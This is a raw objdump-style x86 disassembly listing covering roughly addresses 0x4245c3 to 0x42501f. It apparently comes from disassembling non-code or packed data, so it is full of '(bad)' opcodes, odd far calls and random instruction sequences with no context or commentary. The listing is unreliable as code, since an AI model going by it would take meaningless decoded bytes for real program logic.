  4245c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245c4:	ja     0x42460d
  4245c6:	cmp    al,0x1e
  4245c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245c9:	daa    
  4245ca:	sbb    eax,0xc28f1d89
  4245cf:	rol    bl,0x8a
  4245d2:	cmp    dh,BYTE PTR [eax]
  4245d4:	xchg   edi,eax
  4245d5:	sub    cl,BYTE PTR [edi-0x2c9025ff]
  4245db:	dec    ebx
  4245dc:	fs fcomp st(0)
  4245df:	addr16 js 0x424650
  4245e2:	or     ebp,DWORD PTR [esi-0x54]
  4245e5:	push   ecx
  4245e6:	dec    ebx
  4245e7:	dec    ecx
  4245e8:	imul   edx,eax,0x48e42b99
  4245ee:	or     al,0x4f
  4245f0:	xchg   ebp,eax
  4245f1:	pushf  
  4245f2:	add    ch,BYTE PTR [ebp+0x63eccce7]
  4245f8:	pop    esp
  4245f9:	test   eax,0x488dffca
  4245fe:	and    BYTE PTR [ecx-0x654795b4],bh
  424604:	(bad)  
  424605:	shr    DWORD PTR [eax],1
  424607:	stos   DWORD PTR es:[edi],eax
  424608:	jmp    FWORD PTR [ebp+0x784a07b1]
  42460e:	gs dec edi
  424610:	call   0x8dfa:0x325a1d96
  424617:	pop    ebx
  424618:	(bad)  
  424619:	mov    eax,ds:0x14ca544
  42461e:	popf   
  42461f:	sub    DWORD PTR [eax-0x18],ecx
  424622:	ret    0x502d
  424625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424626:	lahf   
  424627:	add    DWORD PTR [ebx],edi
  424629:	imul   dl
  42462b:	scas   eax,DWORD PTR es:[edi]
  42462c:	test   eax,0xe0e714a4
  424631:	mov    edx,0x4a58170c
  424636:	loop   0x42464f
  424638:	mov    esp,edi
  42463a:	cli    
  42463b:	adc    bl,BYTE PTR [ebx]
  42463d:	fldenv [ebx+ebp*1-0x2b]
  424641:	and    eax,DWORD PTR [edx-0x75]
  424644:	xchg   esp,eax
  424645:	ds mov dh,0x2a
  424648:	push   ebp
  424649:	inc    ebx
  42464a:	scas   eax,DWORD PTR es:[edi]
  42464b:	xchg   DWORD PTR [ebx+edx*1+0x784e5805],ecx
  424652:	(bad)  
  424654:	int    0xb0
  424656:	pushw  cs
  424658:	cmp    eax,0x4ea8407
  42465d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42465e:	lahf   
  42465f:	add    BYTE PTR [ecx-0x128928fa],bl
  424665:	sbb    esi,esi
  424667:	jg     0x424671
  424669:	adc    eax,0x308cb17e
  42466e:	pop    esp
  42466f:	out    dx,al
  424670:	mov    ds:0xda5bd288,eax
  424675:	mov    ds:0x367f8484,eax
  42467a:	mov    ds:0x8f16438a,eax
  42467f:	loopne 0x42466e
  424681:	loopne 0x42463b
  424683:	xchg   DWORD PTR [edx+ebp*2],esi
  424686:	fiadd  DWORD PTR [eax+0x619153ff]
  42468c:	outs   dx,BYTE PTR ds:[esi]
  42468d:	sub    al,0x2e
  42468f:	push   edx
  424690:	mov    WORD PTR [eax],es
	...
  4246f2:	add    BYTE PTR [eax],al
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    bl,dl
  424701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424702:	add    cl,bh
  424704:	dec    esp
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0x82000001,al
  42470d:	mov    esp,0x8b6db581
  424712:	ja     0x42477b
  424714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424715:	fwait
  424716:	mov    esi,0xbb2bc6a5
  42471b:	int3   
  42471c:	push   ds
  42471d:	fcomp  DWORD PTR ds:0x8ef4af28
  424723:	cmp    DWORD PTR [ebx-0x2355aae9],ebp
  424729:	inc    ebp
  42472a:	dec    edx
  42472b:	mov    ah,0x62
  42472d:	cmp    BYTE PTR [edx],al
  42472f:	add    ebx,DWORD PTR [esi+0x41]
  424732:	dec    ebp
  424733:	xor    al,0xe
  424735:	dec    edi
  424736:	nop
  424737:	mov    eax,fs:0xcb70bc50
  42473d:	cmp    eax,0x1b2abcf8
  424742:	arpl   WORD PTR [esi-0x1b],cx
  424745:	leave  
  424746:	jle    0x42479b
  424748:	sub    ebx,DWORD PTR [eax+0x4c]
  42474b:	adc    al,0xd4
  42474d:	rol    eax,0x3d
  424750:	jp     0x42474b
  424752:	mov    bl,0xb7
  424754:	outs   dx,BYTE PTR ds:[esi]
  424755:	ror    DWORD PTR [ebx+0x47],1
  424758:	fcom   QWORD PTR [esi-0x141d262f]
  42475e:	adc    BYTE PTR ds:0x30e3ffbc,ah
  424764:	sub    BYTE PTR [ecx+0x1d],ch
  424767:	xor    DWORD PTR [ecx-0x55],edx
  42476a:	clc    
  42476b:	mov    esp,0x83014223
  424770:	adc    BYTE PTR [eax-0x43],bl
  424773:	jecxz  0x42474d
  424775:	popa   
  424776:	dec    ecx
  424777:	cdq    
  424778:	cmp    eax,0xceb1250f
  42477d:	inc    ecx
  42477e:	dec    edx
  42477f:	fwait
  424780:	cmc    
  424781:	test   eax,0x7d7625df
  424786:	aam    0x1e
  424788:	jnp    0x4247c0
  42478a:	xor    esp,ebx
  42478c:	inc    ebp
  42478d:	jbe    0x4247e6
  42478f:	pushf  
  424790:	push   0x6a69c160
  424795:	mov    edi,0xf44c0856
  42479a:	sahf   
  42479b:	pop    ebp
  42479c:	and    ah,0x68
  42479f:	sti    
  4247a0:	sub    al,0x25
  4247a2:	jno    0x4247ad
  4247a4:	pusha  
  4247a5:	xor    eax,0xbd770ba5
  4247aa:	dec    esp
  4247ab:	mov    al,0xe7
  4247ad:	sbb    esi,eax
  4247af:	gs addr16 in al,0x6d
  4247b3:	lock jne 0x424816
  4247b6:	cmp    BYTE PTR [esi+0x4e],0x69
  4247ba:	sub    BYTE PTR [edx],cl
  4247bc:	jbe    0x424829
  4247be:	adc    edx,DWORD PTR [eax]
  4247c0:	into   
  4247c1:	inc    ecx
  4247c2:	and    al,0xff
  4247c4:	stos   BYTE PTR es:[edi],al
  4247c5:	mov    ebp,0x5dffade9
  4247ca:	cli    
  4247cb:	jno    0x424808
  4247cd:	leave  
  4247ce:	inc    esp
  4247cf:	cs ds mov ebp,0xc5f5fee8
  4247d6:	sub    DWORD PTR [eax-0x1ee589d6],ebp
  4247dc:	je     0x424765
  4247de:	adc    ch,0x4c
  4247e1:	mov    ebp,0x2d539a9f
  4247e6:	dec    eax
  4247e7:	xchg   ebp,eax
  4247e8:	cmp    al,0xf6
  4247ea:	lds    ebx,FWORD PTR [edx+0x35]
  4247ed:	in     eax,0x79
  4247ef:	or     ch,BYTE PTR [ecx]
  4247f1:	mov    ah,0x19
  4247f3:	sub    eax,DWORD PTR [ebp-0x65]
  4247f6:	mov    ds:0xfe8afbb6,eax
  4247fb:	xchg   ebx,eax
  4247fc:	lahf   
  4247fd:	fild   DWORD PTR [edx+0x53be9a0d]
  424803:	jge    0x4247f0
  424805:	(bad)  
  424806:	ror    ebx,cl
  424808:	mov    ?,WORD PTR [esi+0x3c]
  42480b:	lds    edi,FWORD PTR [esi]
  42480d:	call   0x0:0x2f5ee2
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	test   eax,0x51f91253
  424885:	xchg   BYTE PTR [ecx],al
  424887:	add    BYTE PTR ds:0xb5000001,al
  42488d:	aam    0x4b
  42488f:	mov    edx,0xe54cd4b2
  424894:	xor    ebx,DWORD PTR [ebx]
  424896:	push   esp
  424897:	pop    edx
  424898:	mov    WORD PTR [edi+0x4a],cs
  42489b:	fild   WORD PTR [edi+0x68]
  42489e:	sbb    eax,0xa986fec3
  4248a3:	outs   dx,BYTE PTR ds:[esi]
  4248a4:	add    eax,0xbeff8020
  4248a9:	push   edx
  4248aa:	aaa    
  4248ab:	cmc    
  4248ac:	stos   DWORD PTR es:[edi],eax
  4248ad:	mov    al,0x8f
  4248af:	fwait
  4248b0:	cmc    
  4248b1:	mov    edi,ds
  4248b3:	out    dx,al
  4248b4:	ds daa 
  4248b6:	add    al,0xd5
  4248b8:	add    ch,BYTE PTR [ecx]
  4248ba:	out    0x73,eax
  4248bc:	rcl    BYTE PTR gs:[eax-0x55],0x77
  4248c1:	je     0x424933
  4248c3:	and    eax,0x46c66429
  4248c8:	test   eax,0x4a6271d7
  4248cd:	inc    edi
  4248ce:	jno    0x42488f
  4248d0:	gs inc edi
  4248d2:	cmp    ebp,esi
  4248d4:	out    0xc8,eax
  4248d6:	xor    BYTE PTR [ecx],dl
  4248d8:	xor    al,BYTE PTR [ebx+0x65]
  4248db:	jp     0x424860
  4248dd:	jecxz  0x424867
  4248df:	scas   eax,DWORD PTR es:[di]
  4248e1:	push   0xffffffdf
  4248e3:	inc    ecx
  4248e4:	out    dx,eax
  4248e5:	mov    WORD PTR [ebx],ss
  4248e7:	sbb    eax,0xfa2ab693
  4248ec:	cmp    BYTE PTR [ebp+0x1307455e],dl
  4248f2:	cmp    BYTE PTR [ebx+ecx*4],0x47
  4248f6:	push   0x8f446713
  4248fb:	push   ds
  4248fc:	push   cs
  4248fd:	add    al,0xe0
  4248ff:	and    dh,al
  424901:	or     eax,0x48120de7
  424906:	test   eax,0xf6cd7c0b
  42490b:	out    0xf8,al
  42490d:	mov    eax,ds:0x9c9c97cb
  424912:	pop    ss
  424913:	js     0x4248ac
  424915:	lods   eax,DWORD PTR ds:[esi]
  424916:	or     DWORD PTR [ecx],esi
  424918:	or     edi,edi
  42491a:	dec    ecx
  42491b:	add    DWORD PTR [edi+0x9],0x78
  42491f:	leave  
  424920:	mov    ?,WORD PTR [ecx]
  424922:	cmp    al,0x3
  424924:	xor    DWORD PTR [edi-0x43],edx
  424927:	inc    ecx
  424928:	push   ebp
  424929:	xor    bh,BYTE PTR [esi]
  42492b:	dec    esi
  42492c:	xor    BYTE PTR [esi+0x5b],0x4a
  424930:	lea    eax,[eax-0x725e1449]
  424936:	and    BYTE PTR [ebx-0x7d10d180],ch
  42493c:	push   esp
  42493d:	jmp    DWORD PTR [ecx]
  42493f:	ins    BYTE PTR es:[edi],dx
  424940:	push   es
  424941:	rol    DWORD PTR [eax-0x4d98b404],0x71
  424948:	mov    ds:0x6c3c8951,al
  42494d:	stc    
  42494e:	mov    al,ds:0x72f649b1
  424953:	cli    
  424954:	or     BYTE PTR [edx-0x4b],dl
  424957:	lods   eax,DWORD PTR ds:[esi]
  424958:	in     al,0x34
  42495a:	push   cs
  42495b:	inc    ebx
  42495c:	loope  0x42494e
  42495e:	mov    WORD PTR [edx-0x58],ss
  424961:	sbb    DWORD PTR [ebx-0x135ef751],0xffffffee
  424968:	and    dl,BYTE PTR [ebp-0x17]
  42496b:	pop    ss
  42496c:	mov    DWORD PTR [edi+0x4d071368],ebx
  424972:	ret    0xe01a
  424975:	punpckhdq mm6,QWORD PTR [ecx+0x56f1c96b]
  42497c:	aaa    
  42497d:	mov    fs,WORD PTR [ebx]
  42497f:	sub    esi,ecx
  424981:	xor    esp,eax
  424983:	inc    ecx
  424984:	xchg   esp,eax
  424985:	test   eax,0x19b5eb09
  42498a:	inc    eax
  42498b:	ins    DWORD PTR es:[edi],dx
  42498c:	(bad)  
  42498d:	mov    ah,0xeb
  42498f:	(bad)  
  424990:	xor    al,BYTE PTR [eax]
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bh,BYTE PTR [eax]
  424a01:	outs   dx,BYTE PTR ds:[esi]
  424a02:	clc    
  424a03:	inc    edi
  424a04:	push   esi
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0x5c000001,al
  424a0d:	popa   
  424a0e:	xchg   esp,eax
  424a0f:	sub    esp,DWORD PTR [ebx]
  424a11:	push   ds
  424a12:	stos   BYTE PTR es:[edi],al
  424a13:	fidivr WORD PTR [eax+0x3a48dc2c]
  424a19:	add    ah,dl
  424a1b:	nop
  424a1c:	scas   al,BYTE PTR es:[edi]
  424a1d:	inc    ecx
  424a1e:	mov    ss,WORD PTR [edx+eax*1-0xf]
  424a22:	inc    ebp
  424a23:	rcr    DWORD PTR [esi],1
  424a25:	sub    al,0x14
  424a27:	cmp    bl,BYTE PTR [ecx+0x62]
  424a2a:	mov    DWORD PTR [esi+0x55],edx
  424a2d:	mov    esi,0xf352a4b1
  424a32:	and    bl,BYTE PTR es:[edi+0x59]
  424a36:	(bad)  
  424a37:	mov    ebx,0xa05a425a
  424a3c:	(bad)  
  424a3d:	xor    al,0xe
  424a3f:	addr16 inc esp
  424a41:	gs aad 0x81
  424a44:	or     al,dh
  424a46:	xor    eax,0xa9a7d91e
  424a4b:	pop    ebp
  424a4c:	push   0xffffffc7
  424a4e:	jo     0x4249e8
  424a50:	jle    0x424abd
  424a52:	xor    DWORD PTR [esi-0x1c969365],edi
  424a58:	cmp    DWORD PTR [esp+esi*8-0x5],ebp
  424a5c:	es int 0x2e
  424a5f:	ret    0xcc38
  424a62:	icebp  
  424a63:	jb     0x424a6b
  424a65:	mov    ds:0xd9e48719,eax
  424a6a:	jne    0x424a52
  424a6c:	push   ebp
  424a6d:	mul    BYTE PTR [ebx+0x36]
  424a70:	rcl    BYTE PTR [eax-0x21],0xfc
  424a74:	int    0xcc
  424a76:	adc    DWORD PTR [ebx-0x39],edi
  424a79:	jo     0x424a78
  424a7b:	das    
  424a7c:	ins    BYTE PTR es:[edi],dx
  424a7d:	cdq    
  424a7e:	mov    ebp,0x482b794c
  424a83:	adc    al,0xd6
  424a85:	push   eax
  424a86:	lods   eax,DWORD PTR ds:[esi]
  424a87:	mov    edi,0x47b4649b
  424a8c:	xor    edi,ebx
  424a8e:	inc    edi
  424a8f:	xchg   edx,eax
  424a90:	cmp    DWORD PTR [ebx-0x61],ebp
  424a93:	push   cs
  424a94:	js     0x424abe
  424a96:	jl     0x424a89
  424a98:	in     eax,dx
  424a99:	mov    esp,0x2d2c5314
  424a9e:	dec    edx
  424a9f:	shl    DWORD PTR [edi],1
  424aa1:	fldcw  WORD PTR [esp+eiz*8+0x5df2c64]
  424aa8:	std    
  424aa9:	push   ebx
  424aaa:	test   eax,0xc7650f1
  424aaf:	fdiv   QWORD PTR ds:[eax-0x5b]
  424ab3:	adc    ecx,eax
  424ab5:	push   esp
  424ab6:	mov    edi,0xbc28b8f2
  424abb:	xchg   ebp,eax
  424abc:	mov    edi,0xb626ac07
  424ac1:	es xchg edi,eax
  424ac3:	add    eax,0xfd673742
  424ac8:	jno    0x424b2e
  424aca:	jl     0x424b3a
  424acc:	loop   0x424b10
  424ace:	jnp    0x424add
  424ad0:	loopne 0x424abb
  424ad2:	sub    bh,al
  424ad4:	es fwait
  424ad6:	jne    0x424b02
  424ad8:	mov    eax,0x27628a33
  424add:	pop    edx
  424ade:	add    ah,BYTE PTR [eax+ecx*4-0x7a]
  424ae2:	xchg   esp,eax
  424ae3:	test   BYTE PTR [edi],0x3b
  424ae6:	mov    al,0xb8
  424ae8:	cmp    ah,cl
  424aea:	xor    eax,0x964cf250
  424aef:	xchg   ebx,eax
  424af0:	aaa    
  424af1:	shr    DWORD PTR [edx+0x5c],1
  424af4:	sbb    BYTE PTR [edx],0x17
  424af7:	fs dec esp
  424af9:	in     al,0x21
  424afb:	(bad)
  424aff:	sub    dl,dl
  424b01:	cmp    ah,BYTE PTR [ebp-0x2870781e]
  424b07:	mov    ch,0xa
  424b09:	sub    BYTE PTR [edi-0x22be084],bh
  424b0f:	adc    DWORD PTR [esi+0x0],0x0
	...
  424b72:	add    BYTE PTR [eax],al
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	sbb    eax,0x5b425924
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0x12000001,al
  424b8d:	ror    esi,cl
  424b8f:	test   DWORD PTR [ecx],0xb244cea7
  424b95:	dec    ecx
  424b96:	sahf   
  424b97:	jns    0x424bd5
  424b99:	xor    eax,0xa1f134d9
  424b9e:	sbb    DWORD PTR [ecx-0x7b],ebp
  424ba1:	pop    esi
  424ba2:	push   edx
  424ba3:	cmovns edx,DWORD PTR [ebp+0x66]
  424ba7:	test   al,0x95
  424ba9:	mov    eax,0x35af952d
  424bae:	pop    ebp
  424baf:	ja     0x424c30
  424bb1:	adc    al,BYTE PTR [ecx+0x70ed4f33]
  424bb7:	xchg   edi,eax
  424bb8:	sbb    BYTE PTR [edx-0x759f1cf],bl
  424bbe:	ret    
  424bbf:	int3   
  424bc0:	mov    esp,0x96c7b129
  424bc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bc6:	repz test DWORD PTR [edx+ebp*4-0x718b0f92],eax
  424bce:	dec    edi
  424bcf:	cdq    
  424bd0:	retf   0xc980
  424bd3:	xor    esp,DWORD PTR [esi-0x4f]
  424bd6:	daa    
  424bd7:	inc    ecx
  424bd8:	add    BYTE PTR [ebp+edx*2-0x7],ch
  424bdc:	cwde   
  424bdd:	adc    DWORD PTR [ebp-0x59],esi
  424be0:	cmp    BYTE PTR [esp+eiz*4-0x69],ah
  424be4:	pop    esp
  424be5:	inc    esp
  424be6:	(bad)  
  424be7:	out    dx,al
  424be8:	adc    al,0x96
  424bea:	jbe    0x424b94
  424bec:	sti    
  424bed:	js     0x424b97
  424bef:	and    ebp,DWORD PTR [eax+ebx*8-0x49f7e477]
  424bf6:	push   ebx
  424bf7:	aad    0x36
  424bf9:	scas   eax,DWORD PTR es:[edi]
  424bfa:	(bad)  
  424bfb:	jmp    0xbd70ffa2
  424c00:	xchg   ecx,eax
  424c01:	mov    bh,0xfd
  424c03:	ret    
  424c04:	sar    ch,0xfa
  424c07:	scas   al,BYTE PTR es:[edi]
  424c08:	mov    ds:0xd5553ad3,al
  424c0d:	aad    0xc
  424c0f:	fcom   QWORD PTR [ecx]
  424c11:	or     BYTE PTR [esi+0x49],dl
  424c14:	jne    0x424bd4
  424c16:	sub    ecx,edx
  424c18:	vpaddb ymm3,ymm3,ymm1
  424c1c:	pop    esp
  424c1d:	pop    ss
  424c1e:	ds sub eax,ebp
  424c21:	push   0xffffffca
  424c23:	jb     0x424c3c
  424c25:	push   ebx
  424c26:	xor    al,0xc4
  424c28:	loopne 0x424bf6
  424c2a:	cli    
  424c2b:	mov    ebp,0xdd2c244b
  424c30:	int    0xa1
  424c32:	leave  
  424c33:	and    DWORD PTR [edi-0x1fe8016a],edi
  424c39:	loopne 0x424c58
  424c3b:	mov    DWORD PTR [ecx+esi*8+0x2a],edi
  424c3f:	dec    edx
  424c40:	adc    al,0xe
  424c42:	adc    BYTE PTR [bp+0x6a13],bh
  424c47:	cmp    ebp,ebp
  424c49:	push   cs
  424c4a:	fwait
  424c4b:	scas   al,BYTE PTR es:[edi]
  424c4c:	mov    al,ds:0x812303e0
  424c51:	xchg   esi,edi
  424c53:	or     BYTE PTR [ecx],dh
  424c55:	mov    BYTE PTR [edx+0x673f350e],al
  424c5b:	outs   dx,BYTE PTR ds:[esi]
  424c5c:	jg     0x424c86
  424c5e:	and    BYTE PTR [esi],dh
  424c60:	fnstcw WORD PTR [ecx+0xac74cbd]
  424c66:	sar    DWORD PTR [esi-0x4e],1
  424c69:	retf   
  424c6a:	cmp    al,0x26
  424c6c:	xchg   ch,bl
  424c6e:	dec    edi
  424c6f:	fisubr DWORD PTR [ebx-0x18130132]
  424c75:	ficomp DWORD PTR [ecx-0x89962a4]
  424c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c7c:	(bad)  
  424c7d:	loope  0x424ccf
  424c7f:	xchg   BYTE PTR [ecx-0x31],al
  424c82:	push   edx
  424c83:	enter  0xf486,0x6c
  424c87:	xor    esp,DWORD PTR [edi-0x4d]
  424c8a:	sub    eax,0x60a40ddf
  424c8f:	push   ebp
  424c90:	pusha  
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	push   ebx
  424d01:	push   ebp
  424d02:	adc    eax,0x189606d
  424d07:	add    BYTE PTR ds:0x90000001,al
  424d0d:	call   0xbe7b3b8
  424d12:	add    ax,0xb37a
  424d16:	iret   
  424d17:	dec    esp
  424d18:	nop
  424d19:	push   esp
  424d1a:	aaa    
  424d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d1c:	ja     0x424d04
  424d1e:	mov    ds:0xcd7387ce,al
  424d23:	xchg   esp,eax
  424d24:	dec    esp
  424d25:	imul   esp,DWORD PTR [ecx+0x439e2e3f],0xffffff98
  424d2c:	mov    ?,ebx
  424d2e:	enter  0xeb19,0x2c
  424d32:	mov    ch,0xe1
  424d34:	aad    0x87
  424d36:	xchg   esi,eax
  424d37:	sub    ecx,DWORD PTR [edx+0x60]
  424d3a:	push   edi
  424d3b:	enter  0xd9fd,0x3b
  424d3f:	or     ah,BYTE PTR [edi]
  424d41:	push   ecx
  424d42:	stc    
  424d43:	inc    ecx
  424d44:	mov    edx,DWORD PTR [ebx+0x15c75109]
  424d4a:	cld    
  424d4b:	arpl   WORD PTR [eax+0x11fcff7b],cx
  424d51:	dec    ebp
  424d52:	stos   BYTE PTR es:[edi],al
  424d53:	and    al,0x9d
  424d55:	cmp    BYTE PTR [ebx+0x61],al
  424d58:	mov    ebx,0x1327321
  424d5d:	jbe    0x424d96
  424d5f:	vdivpd xmm4,xmm1,XMMWORD PTR [esi-0x47]
  424d64:	xor    eax,0xa9510d9
  424d69:	xor    DWORD PTR [edx],esp
  424d6b:	and    bl,BYTE PTR [edx]
  424d6d:	jno    0x424d68
  424d6f:	scas   eax,DWORD PTR es:[edi]
  424d70:	shl    DWORD PTR [esi-0x1e],cl
  424d73:	dec    edi
  424d74:	add    BYTE PTR [edi+eiz*8],ah
  424d77:	cs add ecx,ecx
  424d7a:	ret    
  424d7b:	dec    ebx
  424d7c:	fcomp  QWORD PTR [esi+0x67]
  424d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d80:	int    0x47
  424d82:	rcl    bh,0xf
  424d85:	dec    ecx
  424d86:	sub    ebp,DWORD PTR ds:0xf289d917
  424d8c:	push   0xffffffb3
  424d8e:	mov    BYTE PTR [edx],dh
  424d90:	push   edi
  424d91:	fisub  WORD PTR [ebx]
  424d93:	stc    
  424d94:	adc    eax,0x6f949db4
  424d99:	inc    ebp
  424d9a:	rol    dl,0x69
  424d9d:	push   0xffffffe4
  424d9f:	mov    bl,0xec
  424da1:	add    BYTE PTR [ecx-0x16c6ef26],dh
  424da7:	mov    eax,0x9e678efd
  424dac:	xor    al,0x5b
  424dae:	inc    edi
  424daf:	ror    ch,cl
  424db1:	mov    WORD PTR [edi],cs
  424db3:	jecxz  0x424d5a
  424db5:	xor    DWORD PTR [edx+eax*8-0x13],ecx
  424db9:	out    0x67,al
  424dbb:	adc    al,0x1a
  424dbd:	scas   al,BYTE PTR es:[edi]
  424dbe:	ds es popa 
  424dc1:	gs pop ecx
  424dc3:	sbb    al,0xcc
  424dc5:	je     0x424d74
  424dc7:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  424dc9:	dec    esp
  424dca:	pusha  
  424dcb:	in     al,dx
  424dcc:	jne    0x424de9
  424dce:	lock pop edi
  424dd0:	out    0x9d,al
  424dd2:	outs   dx,BYTE PTR ds:[esi]
  424dd3:	sub    ebp,0x19
  424dd6:	(bad)  
  424dd7:	xchg   ebp,eax
  424dd8:	test   eax,0xefe5b16
  424ddd:	aam    0x43
  424ddf:	cmp    al,0x5f
  424de1:	retf   
  424de2:	mov    al,0xc5
  424de4:	mov    esi,0xba42c6e9
  424de9:	call   0x9e9a:0xa60a6a63
  424df0:	stos   DWORD PTR es:[edi],eax
  424df1:	dec    ecx
  424df2:	int    0x76
  424df4:	or     eax,0xea088ef6
  424df9:	mov    ds:0x208d4658,eax
  424dfe:	shl    BYTE PTR [eax],1
  424e00:	rol    DWORD PTR ds:[edi+0x54ac6046],1
  424e07:	sub    bl,ah
  424e09:	jne    0x424def
  424e0b:	shl    bh,1
  424e0d:	sar    DWORD PTR [eax],1
  424e0f:	call   DWORD PTR [ecx+0x0]
	...
  424e72:	add    BYTE PTR [eax],al
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424ea9
  424e81:	mov    bh,0x85
  424e83:	or     eax,0x18a65
  424e88:	add    eax,0xf4000001
  424e8d:	sbb    al,0xe7
  424e8f:	sbb    DWORD PTR [eax],ebx
  424e91:	jp     0x424ef5
  424e93:	pusha  
  424e94:	xchg   ebp,eax
  424e95:	dec    ecx
  424e96:	lock dec ecx
  424e98:	sbb    eax,DWORD PTR [ecx]
  424e9a:	cmp    BYTE PTR [ecx],0x63
  424e9d:	add    al,0xaf
  424e9f:	mov    WORD PTR [esi],?
  424ea1:	or     al,0xf0
  424ea3:	xchg   BYTE PTR [ebp+0x202f143b],dl
  424ea9:	push   ss
  424eaa:	aam    0xd0
  424eac:	sti    
  424ead:	xchg   esi,eax
  424eae:	fprem  
  424eb0:	rcr    cl,cl
  424eb2:	(bad)
  424eb5:	pop    es
  424eb6:	and    BYTE PTR [esi-0x5cb7c7cd],0x1c
  424ebd:	std    
  424ebe:	xor    eax,0xcc6e2e68
  424ec3:	sbb    DWORD PTR [edi-0x6fc3378d],eax
  424ec9:	push   ss
  424eca:	fimul  DWORD PTR [ebp-0x7204a64b]
  424ed0:	adc    al,0x48
  424ed2:	and    edx,DWORD PTR [esi]
  424ed4:	cld    
  424ed5:	push   edx
  424ed6:	xor    DWORD PTR [esi-0x4b36aea0],0x7879e8d7
  424ee0:	sbb    dh,dl
  424ee2:	nop
  424ee3:	call   0x688c:0xca515466
  424eea:	imul   eax,DWORD PTR [ebp+0x2c98c31c],0x4e
  424ef1:	popf   
  424ef2:	repnz sbb eax,0x8c1ff500
  424ef8:	test   eax,0x749ce7a6
  424efd:	sti    
  424efe:	frstor [esi]
  424f00:	mov    cl,0x37
  424f02:	xchg   DWORD PTR [ebx+0x8],edi
  424f05:	cwde   
  424f06:	add    BYTE PTR [ebx-0x23],bh
  424f09:	and    ah,BYTE PTR [edi+0x552429d]
  424f0f:	std    
  424f10:	push   ecx
  424f11:	xchg   edi,eax
  424f12:	jnp    0x424eee
  424f14:	pop    ebx
  424f15:	cld    
  424f16:	pop    edi
  424f17:	fbstp  TBYTE PTR [edi]
  424f19:	test   BYTE PTR [ecx+0x7e],bh
  424f1c:	or     DWORD PTR [esi+0x6d9f06fe],edi
  424f22:	jle    0x424f5b
  424f24:	inc    ebx
  424f25:	sbb    eax,ebx
  424f27:	xchg   BYTE PTR [esi],dl
  424f29:	xchg   edx,eax
  424f2a:	mov    edi,0xf1775b4
  424f2f:	mov    cl,0x59
  424f31:	out    dx,al
  424f32:	mov    BYTE PTR [eax-0x3d],0xf4
  424f36:	push   cs
  424f37:	fcom   QWORD PTR [ecx]
  424f39:	pop    ecx
  424f3a:	xor    bl,BYTE PTR [eax-0x7e82d2b8]
  424f40:	cwde   
  424f41:	(bad)  
  424f42:	mov    dh,0xb2
  424f44:	lea    ebx,[ecx+ecx*8]
  424f47:	ffree  st(2)
  424f49:	push   cs
  424f4a:	sbb    DWORD PTR [edx],edx
  424f4c:	test   dl,ah
  424f4e:	sahf   
  424f4f:	sub    esi,DWORD PTR [ebx]
  424f51:	iret   
  424f52:	pop    esp
  424f53:	jno    0x424f04
  424f55:	fisub  WORD PTR [edx-0x3e]
  424f58:	or     BYTE PTR ds:[esp+esi*4-0x2f],bh
  424f5d:	jbe    0x424efe
  424f5f:	jge    0x424f35
  424f61:	int    0x64
  424f63:	sar    ecx,1
  424f65:	dec    ebx
  424f66:	call   0xd5f67770
  424f6b:	sub    BYTE PTR [ebp+0x34],bh
  424f6e:	arpl   di,cx
  424f70:	dec    esp
  424f71:	test   eax,0xb6bddae3
  424f76:	ret    
  424f77:	inc    esp
  424f78:	lahf   
  424f79:	scas   eax,DWORD PTR es:[edi]
  424f7a:	fidiv  WORD PTR [eax+eax*2-0x6aaac44d]
  424f81:	dec    esp
  424f82:	adc    al,0x78
  424f84:	sbb    dh,BYTE PTR [edi-0x38]
  424f87:	cs pop es
  424f89:	xor    BYTE PTR [esi+0x1458760a],0x65
  424f90:	pop    ebp
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	mov    edx,0x6a5f68ae
  425005:	mov    eax,DWORD PTR [ecx]
  425007:	add    BYTE PTR ds:0x48000001,al
  42500d:	xrelease mov DWORD PTR [ebp+0x46],esp
  425011:	aaa    
  425012:	cld    
  425013:	pop    ebx
  425014:	adc    esi,esp
  425016:	xor    ch,dl
  425018:	xor    BYTE PTR [edi+esi*1+0xb],al
  42501c:	sub    al,0xd5
  42501e:	pop    ecx
  42501f:	nop
